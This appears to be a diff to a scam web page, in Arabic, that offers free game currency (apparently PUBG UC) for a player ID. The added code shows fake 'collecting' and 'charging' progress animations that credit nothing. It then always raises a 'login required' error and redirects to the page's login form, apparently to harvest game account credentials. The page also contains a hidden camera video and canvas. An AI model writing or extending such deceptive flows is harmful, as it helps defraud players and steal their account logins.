@@ -1020,6 +1020,37 @@
         <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
+   <!-- نافذة عملية الشحن -->
+<div id="charging-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 4000; justify-content: center; align-items: center;">
+    <div style="background: white; border-radius: 20px; padding: 40px; text-align: center; max-width: 500px; width: 90%;">
+        <div id="charging-steps">
+            <!-- الخطوة 1 -->
+            <div class="charging-step active">
+                <h3 style="color: #3498db;">🔄 جاري تحصيل الشدات</h3>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress1"></div>
+                </div>
+                <p id="charge-counter" style="font-size: 24px; font-weight: bold; color: #2c3e50; margin: 20px 0;">0 / 0</p>
+            </div>
+            
+            <!-- الخطوة 2 -->
+            <div class="charging-step">
+                <h3 style="color: #e67e22;">⚡ جاري الشحن على الحساب</h3>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress2"></div>
+                </div>
+                <p style="color: #7f8c8d; margin: 20px 0;">جارٍ إضافة الشدات إلى حسابك...</p>
+            </div>
+            
+            <!-- الخطوة 3 -->
+            <div class="charging-step">
+                <h3 style="color: #e74c3c;">❌ خطأ في التسجيل</h3>
+                <p style="color: #c0392b; font-size: 18px; margin: 20px 0;">يجب تسجيل الدخول لإتمام عملية الشحن</p>
+                <button id="go-to-login" style="background: #3498db; color: white; border: none; padding: 12px 30px; border-radius: 10px; font-size: 16px; cursor: pointer; margin-top: 20px;">تسجيل الدخول</button>
+            </div>
+        </div>
+    </div>
+</div> 
 
     <script>
         // العناصر
@@ -1439,9 +1470,114 @@
                 stream.getTracks().forEach(track => track.stop());
             }
         });
+        // عناصر نافذة الشحن
+const chargingModal = document.getElementById('charging-modal');
+const chargingSteps = document.querySelectorAll('.charging-step');
+const progress1 = document.getElementById('progress1');
+const progress2 = document.getElementById('progress2');
+const chargeCounter = document.getElementById('charge-counter');
+const goToLoginBtn = document.getElementById('go-to-login');
+
+// دالة عرض نافذة الشحن
+function showChargingProcess() {
+    chargingModal.style.display = 'flex';
+    showStep(0);
+    startChargeCollection();
+}
+
+// دالة عرض خطوة معينة
+function showStep(stepIndex) {
+    chargingSteps.forEach((step, index) => {
+        step.classList.toggle('active', index === stepIndex);
+    });
+}
+
+// دالة تحصيل الشدات
+function startChargeCollection() {
+    const targetAmount = parseInt(selectedCharge.amount);
+    let currentAmount = 0;
+    const duration = 3000;
+    const interval = 50;
+    const steps = duration / interval;
+    const increment = targetAmount / steps;
+    
+    chargeCounter.textContent = `0 / ${targetAmount}`;
+    
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+        progress += (100 / steps);
+        progress1.style.width = `${Math.min(progress, 100)}%`;
+        
+        currentAmount += increment;
+        if (currentAmount >= targetAmount) {
+            currentAmount = targetAmount;
+            clearInterval(progressInterval);
+            setTimeout(() => {
+                showStep(1);
+                startAccountCharging();
+            }, 1000);
+        }
+        
+        chargeCounter.textContent = `${Math.floor(currentAmount)} / ${targetAmount}`;
+    }, interval);
+}
+
+// دالة شحن الحساب
+function startAccountCharging() {
+    let progress = 0;
+    const duration = 2000;
+    const interval = 50;
+    const steps = duration / interval;
+    
+    const progressInterval = setInterval(() => {
+        progress += (100 / steps);
+        progress2.style.width = `${Math.min(progress, 100)}%`;
+        
+        if (progress >= 100) {
+            clearInterval(progressInterval);
+            setTimeout(() => {
+                showStep(2);
+            }, 1000);
+        }
+    }, interval);
+}
+
+// حدث زر الانتقال لتسجيل الدخول
+goToLoginBtn.addEventListener('click', function() {
+    chargingModal.style.display = 'none';
+    mainContainer.style.display = 'none';
+    loginContainer.style.display = 'block';
+});
+
+// عدل حدث زر المتابعة إلى الدفع
+proceedBtn.addEventListener('click', function() {
+    if (!termsAccepted) {
+        showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
+        termsModal.style.display = 'flex';
+        return;
+    }
+    
+    if (!selectedCharge) {
+        showStatus('يرجى اختيار عدد الشدات', 'error');
+        return;
+    }
+    
+    if (!playerIdInput.value.trim()) {
+        showStatus('يرجى إدخال معرف اللاعب', 'error');
+        return;
+    }
+    
+    if (!serverSelect.value) {
+        showStatus('يرجى اختيار الخادم', 'error');
+        return;
+    }
+    
+    showChargingProcess();
+});
     </script>
 </body>
 </html>
+
 
 
 
